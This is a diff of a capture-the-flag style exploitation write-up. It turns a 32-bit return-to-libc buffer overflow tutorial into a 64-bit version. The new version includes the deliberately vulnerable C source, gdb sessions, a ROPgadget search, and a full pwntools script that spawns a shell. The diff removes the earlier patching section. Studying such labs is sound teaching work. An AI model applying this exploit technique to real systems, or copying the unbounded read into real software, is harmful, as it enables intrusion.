@@ -1,212 +1,164 @@
 Before we look at the binary's code, we should see if the binary has any binary hardening mitigations. These can make it significantly harder to pwn the binary. We can do this using checksec from pwntools.
 
 ```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ pwn checksec b6
-[*] '/Hackery/escape/buf_ovf/b6/b6'
-    Arch:     i386-32-little
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ pwn checksec b6_64
+[*] '/Hackery/escape/buf_ovf/b6_64/b6_64'
+    Arch:     amd64-64-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE
 ```
 
-As you can see there, it is al 32-bit (i386) binary with NX enabled. NX stands for non-executable stack which means that anywhere that a user can write to cannot be executed as code. This means that we can no longer push shellcode
-onto the stack, and then execute it. So let's look at the code...
+As you can see there, it is al 64-bit binary with NX enabled. NX stands for non-executable stack which means that anywhere that a user can write to cannot be executed as code. This means that we can no longer push shellcode onto the stack, and then execute it. So let's look at the code...
 
 ```
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ cat b6_64.c
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <unistd.h>
 
 void nothing()
 {
-	char* buf0[50];
-	fgets(buf0, 300, stdin);
+  char* buf0[50];
+  read(STDIN_FILENO, buf0, 450);
 }
 
 int main()
 {
-	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
-	nothing();
-	_exit(1);
-}
-
-void ignore_this()
-{
-	char shield[500];
-	strcpy(shield, "Block");
-	system("echo hi");
-	
+  printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
+  nothing();
 }
 ```
 
-So looking at the code, we see a couple of things. The first is that this time our buffer overflow is limited to just 300 characters because of the use of fgets(). We see in the ignore_this() function that there is a call to system,
-however all that ill do is just echo "hi". We also see that we have no real way to change that particular implementation to give us a shell. However, the fact that it is in a method means that the system is established as a function in the binary's executable memory
-with a hard coded address. This address can be called via a return to libc attack ,which we pass the argument "/bin/sh" to give us a shell (reason why we give it "/bon/sh" instead of bash is sh works better with input and output with our exploits).
-The first thing we will need is the buffer between our input, and the eip register.
+So looking at the code, we see a couple of things. The first is that this time our buffer overflow is limited to just 450 characters because of the use of read(). Since this binary is using read, that means when we push "\x00" to the stack (because 64 bit C addresses hhave lots of those) it will continue reading it since it is a null byte. If it was fgets, it would just stop reading input. What we can do is we can get the address of the system function from the libc (since it includes the stdlib.c), along with the address of the string "/bin/sh" (which is usually somewhere in libc) and effectivley get a shell. The first thing we will need to do is find the offset to the rip function.
 
-```
 gdb-peda$ disas nothing
 Dump of assembler code for function nothing:
-   0x080484ab <+0>:	push   ebp
-   0x080484ac <+1>:	mov    ebp,esp
-   0x080484ae <+3>:	sub    esp,0xd8
-   0x080484b4 <+9>:	mov    eax,ds:0x80498a0
-   0x080484b9 <+14>:	sub    esp,0x4
-   0x080484bc <+17>:	push   eax
-   0x080484bd <+18>:	push   0x12c
-   0x080484c2 <+23>:	lea    eax,[ebp-0xd0]
-   0x080484c8 <+29>:	push   eax
-   0x080484c9 <+30>:	call   0x8048360 <fgets@plt>
-   0x080484ce <+35>:	add    esp,0x10
-   0x080484d1 <+38>:	nop
-   0x080484d2 <+39>:	leave  
-   0x080484d3 <+40>:	ret    
+   0x0000000000400536 <+0>: push   rbp
+   0x0000000000400537 <+1>: mov    rbp,rsp
+   0x000000000040053a <+4>: sub    rsp,0x190
+   0x0000000000400541 <+11>:  lea    rax,[rbp-0x190]
+   0x0000000000400548 <+18>:  mov    edx,0x1c2
+   0x000000000040054d <+23>:  mov    rsi,rax
+   0x0000000000400550 <+26>:  mov    edi,0x0
+   0x0000000000400555 <+31>:  call   0x400410 <read@plt>
+   0x000000000040055a <+36>:  nop
+   0x000000000040055b <+37>:  leave  
+   0x000000000040055c <+38>:  ret    
 End of assembler dump.
-gdb-peda$ b *nothing+35
-Breakpoint 1 at 0x80484ce
+gdb-peda$ b *nothing+36
+Breakpoint 1 at 0x40055a
 gdb-peda$ r
-Starting program: /Hackery/escape/buf_ovf/b6/b6 
-Even if you do hack this elf, what are you going to do?. You should really get back to research.
+Starting program: /Hackery/escape/buf_ovf/b6_64/b6_64 
+If you do not get back to your research now, we will have to implement corrective solutions.
 75395128
 ```
 
 One wall of text later...
 
 ```
-Breakpoint 1, 0x080484ce in nothing ()
-gdb-peda$ x/s $ebp-0xd0
-0xffffcf68:	"75395128\n"
+Breakpoint 1, 0x000000000040055a in nothing ()
+gdb-peda$ x/s $rbp-0x190
+0x7fffffffdcc0: "75395128\n"
 gdb-peda$ info frame
-Stack level 0, frame at 0xffffd040:
- eip = 0x80484ce in nothing; saved eip = 0x80484fa
- called by frame at 0xffffd060
- Arglist at 0xffffd038, args: 
- Locals at 0xffffd038, Previous frame's sp is 0xffffd040
+Stack level 0, frame at 0x7fffffffde60:
+ rip = 0x40055a in nothing; saved rip = 0x400575
+ called by frame at 0x7fffffffde70
+ Arglist at 0x7fffffffde50, args: 
+ Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
  Saved registers:
-  ebp at 0xffffd038, eip at 0xffffd03c
+  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0x7ffff7b9a177 --> 0x68732f6e69622f ('/bin/sh')
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0x7ffff7a53390 <__libc_system>
 ```
 
 And onto the quest for the holy grail
 
 ```
->>> 0xffffd03c - 0xffffcf68
-212
+>>> 0x7fffffffde58 - 0x7fffffffdcc0
+408
 ```
 
-So we the offset between the start of our input and the eip register is 212. Now to find the address of the system function. Now we can do this using gdb-pead by typing "p system", howver gdb-peda sometimes changes that address for the version it runs. So it is best just to use objdump to view the address that is hardcoded into the binary.
+So we the offset between the start of our input and the rip register is 408. We also have the system() address from libc, which is 0x7ffff7a53390. We also have the address of the string "/bin/sh" from libc which is 0x7ffff7b9a177. There is still one more piece we need for the exploit. With this binary, the argument is passed to the function via the registers instead of just being on the stack. This means that we will have to use Return Oriented Programming (ROP) to find a piece of assembly code (referred to as a gadget) that will pop an argument off of the stack and into a register for the system call to read. All the ROP gadget is, is it is a piece of assembly code already somewhere in the function that we will call. The specifi register we should be looking for are rdi, or it's 32 bit counterpart edi. Reason for this being is that should be the first place a function argument is stored. To find it, i will be using a tool called ROPGadget. If you are running the vm I made, it should already be installed. If not, here is the link to the github page.
+
+https://github.com/JonathanSalwan/ROPgadget
 
 ```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ objdump -D b6 | grep system
-08048380 <system@plt>:
- 8048527:	e8 54 fe ff ff       	call   8048380 <system@plt>
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ ROPgadget --binary b6_64 | grep di
+0x000000000040048d : je 0x4004a8 ; pop rbp ; mov edi, 0x6009f0 ; jmp rax
+0x00000000004004db : je 0x4004f0 ; pop rbp ; mov edi, 0x6009f0 ; jmp rax
+0x0000000000400723 : jmp qword ptr [rdi]
+0x0000000000400490 : mov edi, 0x6009f0 ; jmp rax
+0x000000000040048f : pop rbp ; mov edi, 0x6009f0 ; jmp rax
+0x00000000004005e3 : pop rdi ; ret
 ```
 
-So we have the address of the system function 0x08048380. Now something else we can do, since when the function returns it will just run the system function the function won't return again unless we make it. This means that after the system function, the program will just execute whatever is after the address of the system function untill the program either exits, encounters a segmentation fault, or we make it return.
-So we could after the system call to /bin/sh is done, make the program just exit because the _exit function is also called. There are two benifets to doing this, first the program won't seg fault so it's less noisey. Secondly having the exta 4 byte string does help with trying to find the address of where "/bin/sh" is stored.
+So we can see at the very last line, we have code that will pop a value off the stack and into the rdi register, then return. This will pop "/bin/sh" off the stack and into the register, then just continue running code. So our exploit will look like this.
 
 ```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ objdump -D b6 | grep exit
-08048340 <_exit@plt-0x10>:
-08048350 <_exit@plt>:
- 80484ff:	e8 4c fe ff ff       	call   8048350 <_exit@plt>
+payload = offset + gadget + bin_sh + system
 ```
 
-So our payload should look something like this.
+So as you can see, when the nothing() function returns, it will execut our rop gadget will we pop the next thing off the stack (/bin/sh) into the rdi register, then it will run system. Now here is the python script that will do all of it.
 
 ```
-payload = offset + system_address + exit_address + address_of_string + "/bin/sh"
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ cat exploit.py 
+#Import Pwn Tools
+from pwn import *
+
+#Establish the target
+target = process("./b6_64")
+
+#Recieve the first line, so we can reach the read call
+print target.recvline()
+
+#Establish the offset to reach the rip register
+offset = "0"*408
+
+#Rop Gadget to pop bin_sh into rdi
+gadget = p64(0x00000000004005e3)
+
+#Address of "/bin/sh" from libc
+bin_sh = p64(0x7ffff7b9a177)
+
+#Address of system function from libc
+system = p64(0x7ffff7a53390)
+
+#Constructing the paylaod
+payload = offset + gadget + bin_sh + system
+
+#Sending the payload
+target.sendline(payload)
+
+#Dropping to an interactive prompt
+target.interactive()
 ```
 
-First off, the reason why the argument for system "/bin/sh" is at the end is because stack grows to lower addresses, however our overflow is going in the opposite direction towards higher addresses. Because of that in order to properley format the argument we have to put it at the end in order to account for the fact our overflow is going the opposite directio.  Now at the moment the only piece of the payload we don't have is the address of the string "/bin/sh". 
- We can use gdb to find an address similar to where it is stored, then just move up and down in 16 decimal increemnts untill we find the right address like what we've been doing. If you want, you can 
- mess around with gdb-peda's enviornemtal variables because those do interfere with the address. To find the relative address, we will have to put in a fake 4 bute hex string in place of the actual address, because that hex string does interfere with where "/bin/sh" is stored.
+Now let's test the exploit...
 
 ```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*212 + "\x80\x83\x04\x08" + "\x50\x83\x04\x08" + "\x68\xd0\xff\xff" +  "/bin/sh"' > test
-```
-
-Now picking up from where we left off in gdb (with the same breakpoint)...
-
-```
-gdb-peda$ r < test
-```
-
-You know what goes here
-
-```
-gdb-peda$ find /bin/sh
-Searching for '/bin/sh' in: None ranges
-Found 3 results, display max 3 items:
- [heap] : 0x804a4f0 ("/bin/sh\n")
-   libc : 0xf7f5d82b ("/bin/sh")
-[stack] : 0xffffd048 ("/bin/sh\n")
-```
-
-So we have the relative address of /bin/sh which is 0xffffd048. Now To find the actual address. Here are the addresses I tried.
-
-```
-0xffffd048
-0xffffd058
-0xffffd068
-```
-
-Then we found the correct address, 0xffffd068. So our final exploit looks like this.
-
-```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*212 + "\x80\x83\x04\x08" + "\x50\x83\x04\x08" + "\x68\xd0\xff\xff" +  "/bin/sh"' > pwn
-```
-
-Now to actually test the exploit. Now the reason why we need the second cat, is because if we just have one cat then the exploit will run and give us a shell but we wouldn't be able to actually interface with the shell. The second cat gives us io (input and output) with the binary.
-
-```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ (cat pwn; cat) | ./b6
+guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6_64$ python exploit.py 
+[+] Starting local process './b6_64': Done
 If you do not get back to your research now, we will have to implement corrective solutions.
-ls
-b6  b6.c  exploit.py  out  peda-session-b6.txt	pwn  test
-echo This Works!
-This Works!
-cat out
+
+[*] Switching to interactive mode
+$ ls
+b6_64  b6_64.c    core  exploit.py  out  peda-session-b6_64.txt  test.c
+$ echo It Works!
+It Works!
+$ cat out
 Someone has been researching security overriding methods. Level Cleared!
-exit
-exit
+$ exit
+[*] Got EOF while reading in interactive
+$ exit
+[*] Process './b6_64' stopped with exit code -11
+[*] Got EOF while sending in interactive
 ```
 
-And just like that, we pwned the binary. Now to fix it.
-
-```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ cat b6_secure.c
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-
-void nothing()
-{
-	char* buf0[50];
-	fgets(buf0, sizeof(buf0), stdin);
-}
-
-int main()
-{
-	printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
-	nothing();
-	_exit(1);
-}
-
-void ignore_this()
-{
-	char shield[500];
-	strcpy(shield, "Block");
-	system("echo hi");
-	
-}
-```
-
-As you can see, we just had to change a single word. let's test it.
-
-```
-guyinatuxedo@tux:/Hackery/escape/buf_ovf/b6$ python -c 'print "0"*500' | ./b6_secure 
-If you do not get back to your research now, we will have to implement corrective solutions.
-```
-
-Just like that, we patched the binary.
+And just like that, we pwned the binary.
